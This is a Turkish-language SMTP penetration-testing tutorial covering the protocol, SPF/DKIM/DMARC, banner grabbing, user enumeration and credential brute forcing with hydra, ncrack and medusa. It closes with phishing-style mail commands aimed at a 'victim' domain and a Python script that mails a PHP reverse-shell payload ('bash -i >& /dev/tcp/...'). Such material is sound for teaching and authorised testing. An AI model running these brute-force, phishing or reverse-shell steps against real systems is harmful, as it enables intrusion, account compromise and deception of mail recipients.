---
title: 25 - SMTP Pentesting
author: Acivik
date: 2023-01-12 15:30:00 +0300 
categories: [Pentesting, Enumeration, Protokoller]
tags: [SMTP, 25/tcp, enumeration, pentest, exploit, scan, protocols, protokoller]
---

# SMTP Nedir?

SMTP(Simple Mail Transfer Protocol), sunucular arasında mail göndermek ve almak için kullanılan TCP/IP protokolüdür. Alıcı tarafında mesajları sıraya koymak ve kaydetmek için POP3(Post Office Protocol) veya IMAP(Internet Message Access Protocol) ile birlikte kullanılır.

# SMTP Nasıl Çalışır?

İlk olarak outlook, webmail gibi bir e-posta istemcisi mesaj göndermek için SMTP kullanır ve mesajı sunucuya gönderir. İkinci aşamada gönderen sunucu alıcı sunucuya SMTP kullanarak gönderir. 

Son olarak alıcı istemci sunucudan POP3 veya IMAP kullanarak outlook, webmail gibi istemciler ile birlikte mesajları alır.

![https://i.ibb.co/KhNVg2N/image.png](https://i.ibb.co/KhNVg2N/image.png)

Smtp client ve server arasındaki konuşma şu şekildedir.

![https://i.ibb.co/D4pgxm8/image.png](https://i.ibb.co/D4pgxm8/image.png)

🟢 Genellikle SMTP Protokolünü 25, 465, 587, 2525, 2526 numaralı portlarda görebiliriz.

**Mail User Agent (MUA):** E-posta göndermek için SMTP sunucusuna bağlanan bir programdır.

Büyük olasılıkla bu sizin Outlook'unuz vs. vs. olabilir.

**Mail Transfer Agent (MTA):** Bir programın aktarım hizmetidir. E-postaları alır ve aktarırlar. Bu bir Exchange sunucusu veya İnternet'e yönelik bir getway vb. olabilir.

### SMTP Komutları:

`HELP`: Komutlar listelenir.

`HELO`: SMTP sunucusu ile SMTP iletişimi başlatılır.

`EHLO`: Genişletilmiş SMTP iletişimi için kullanılır.

`AUTH`: İstemcinin kimlik doğrulaması için kullanılır.

`MAIL` FROM: E-posta göndericisi belirtilir.

`RCPT TO`: E-posta alıcısı belirtilir.

`DATA`: E-postanın içeriği belirtilir. E-posta içeriği, “.” ifadesi içeren satır ile tamamlanmış olur.

`SUBJECT`: E-postanın konusu belirtilir.

`QUIT`: Oturum sonlandırılır.

`VRFY`: E-posta kutusu alıcısı doğrulanır.

`EXPN`: E-posta listesi doğrulanır.

`STARTTLS`: SMTP iletişimi TLS üzerinden başlatılır.

`RSET`: E-posta iletişimi kesilir.

# SPF(Sender Policy Framework) Nedir?

SPF kayıtları, kurumun domainini kullanarak hangi mail sunucularının mail gönderebileceğini belirtebilen mekanizmalar sağlar. SPF Kayıtlarını DNS Sunucusunu sorgulayarak görebiliriz. SPF kayıtları, mail spoofing ve phising saldırılarını önlemeyi amaçlar.

![https://i.ibb.co/rscb40V/image.png](https://i.ibb.co/rscb40V/image.png)

Bir mekanizma ile eşleşildiğinde ne yapılmasını belirten qualifications tanımlanır. Default olarak `+` kullanılır. Yani eşleşildiğinde buna izin verir.

Genellikle SPF politikalarının sonunda `~all` veya `-all` görülür. Bunun anlamı gönderen eğer hiç bir politikayla eşleşmiyorsa güvenilmeyen(~) veya reddedilmesi(-) gerektiği şeklinde tanımlanması için kullanılır.

### Qualifiers

- `+` PASS → SPF kaydı, göndermesine izin verilecek ana bilgisayarı belirtir.
- `?` NEUTRAL → SPF kaydı, geçerlilik hakkında hiçbir şey söylenemeyeceğini açıkça belirtir.
- `~` SOFTFAIL → SPF kaydı, sunucunun göndermesine izin verilmediğini, ancak geçiş aşamasında olduğunu belirtir.
- `-` FAIL → SPF kaydı, ana bilgisayarı göndermesine izin verilmeyen olarak belirtir.

`nslookup` veya `dig` ile spf politikaları görüntülenebilir.

```bash
# nslookup -type=txt google.com | grep spf
google.com      text = "v=spf1 include:_spf.google.com ~all"

# nslookup -type=txt _netblocks.google.com | grep spf
_netblocks.google.com   text = "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

# nslookup -type=txt _netblocks2.google.com | grep spf
_netblocks2.google.com  text = "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"
```

# DKIM(DomainKeys Identified Mail) Nedir?

Türkçe karşılığı “Anahtarlarıyla Tanımlanmış E-Posta” dır. Amacı phishing ve spamı önlemek için mailin gerçekten bağlı olduğu domainden gelip, gelmediğini mail authentication yaparak yanıtlamaktır.

DKIM Public keyi domain için TXT kaydında tutulur. Ancak kaydı alabilmek için selector ve domain adını bilmeniz gerekir. Örneğin: `d=gmail.com;s=20120113`

```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```

# DMARC Nedir?

Domain-based Message Authentication, Reporting & Conformance, Domain tabanlı ileti kimlik doğrulamasıdır. E-posta göndericilerinin ve alıcılarının doğru kişi olup olmadığını ve izni olup olmadığını kontrol eden bir yapıdır. Doğrulama sonucunda ne tür önlem ve işlem yapacağı belirlenir.

Domain için e-postanın nasıl işleneceğini ve gerçekleştirilen eylemlerin nasıl raporlanacağını tanımlar.

![https://i.ibb.co/nfJ4rm9/image.png](https://i.ibb.co/nfJ4rm9/image.png)

DMARC kaydını elde etmek için _dmarc alt alan adını sorgulamanız gerekir.

![https://i.ibb.co/Sd397Ft/image.png](https://i.ibb.co/Sd397Ft/image.png)

PayPal ve Yahoo, posta sunucularına geçersiz DKIM imzaları içeren veya kendi ağlarından gelmeyen iletileri reddetme talimatı verir. Bildirimler daha sonra her kuruluş içindeki ilgili e-posta adreslerine gönderilir. 

Google, posta sunucularına iletileri karantinaya almaları ve doğrudan reddetmemeleri talimatını vermesine rağmen benzer şekilde yapılandırılmıştır.

| TAG Adı | Amacı | Örnek |
| --- | --- | --- |
| v | Protokol Versiyon | v=DMARC1 |
| pct | Filtrelemeye tabi tutulan iletilerin yüzdesi | pct=20 |
| ruf | forensic raporları için raporlama URI'si | ruf=mailto:<nolink>authfail@example.com</nolink> |
| rua | Toplu raporların raporlama URI'si | rua=mailto:<nolink>authfail@example.com</nolink> |
| p | Kuruluş domain için politika | p=quarantine |
| sp | OD'nin subdomains için politika | sp=reject |
| adkimadkim | DKIM için alignment modu | adkim=s |
| aspf | SPF için alignment modu | aspf=r |

- [https://github.com/serain/mailspoof](https://github.com/serain/mailspoof) SPF ve DMARC yanlış yapılandırmalarını kontrol edin
- [https://pypi.org/project/checkdmarc/](https://pypi.org/project/checkdmarc/) SPF ve DMARC yapılandırmalarını otomatik olarak alma

### Spoofing Kontrol Etmek

Spoofing yapılabilir mi, e-postamıza ulaşılabilir mi? Bunu kontrol etmek için online araç kullanabiliriz. [http://www.anonymailer.net/](http://www.anonymailer.net/)

### Diğer Phishing Belirtileri

- Domain yaşı.
- IP Adresi işaret eden linkler.
- Link manipülasyonları.
- Şüpheli attachments.
- Geçerli ve güvenilir bir SSL sertifikasının varlığı.

# SMTP Porotokolüne Yönelik Sızma Testi

```bash
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
```

## Shodan Araması

| ![https://www.shodan.io/static/img/favicon.png](https://www.shodan.io/static/img/favicon.png) [Shodan Arama Sorgusu](https://www.shodan.io/search?query=port%3A25%2C465%2C587%2C2525%2C2526) |
| --- |
|`port:25,465,587,2525,2526`|

## Banner Grabbing / SMTP Bağlanma

```bash
#SMTP
telnet 10.10.11.101 25
nc -nv 10.10.11.101 25
nmap -sV --script=banner 10.10.11.101 -p 25

#SMTPS
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

![https://i.ibb.co/TTccBQz/image.png](https://i.ibb.co/TTccBQz/image.png)

## Bir Kuruluşun MX Sunucularını Bulma

```bash
dig +short mx google.com
```

## Desteklenen Komutları Bulma

```bash
nmap -p25 10.10.11.101 -sV --script=smtp-commands

#Eğer Server NTLM auth Destekliyorsa
nmap -sV --script=smtp-ntlm-info 10.10.11.101 -p 25
```

```bash
root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

## User Enumeration

### Kimlik Bilgileri İçin Brute Force

```bash
hydra -L userlist.txt -P passlist.txt 10.10.11.101 smtp
ncrack -p 25 -U userlist.txt -P passwords.txt 10.10.11.101
medusa -U userlist.txt -P passlist.txt -h 10.10.11.101 -M smtp
```

### Kullanıcıları Bulmak İçin Brute Force

```bash
smtp-user-enum -M VRFY -U userlist.txt -t 10.10.11.101
nmap -sV --script smtp-enum-users 10.10.11.101 -p 2
msf6 > use auxiliary/scanner/smtp/smtp_enum
```

![https://i.ibb.co/zfyGb0g/image.png](https://i.ibb.co/zfyGb0g/image.png)

### RCPT TO

```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

### VRFY

```bash
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```

### EXPN

```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```

## Linux Konsolundan Email Göndermek

```bash
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```

## Python Scripti ile Email Göndermek

```bash
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
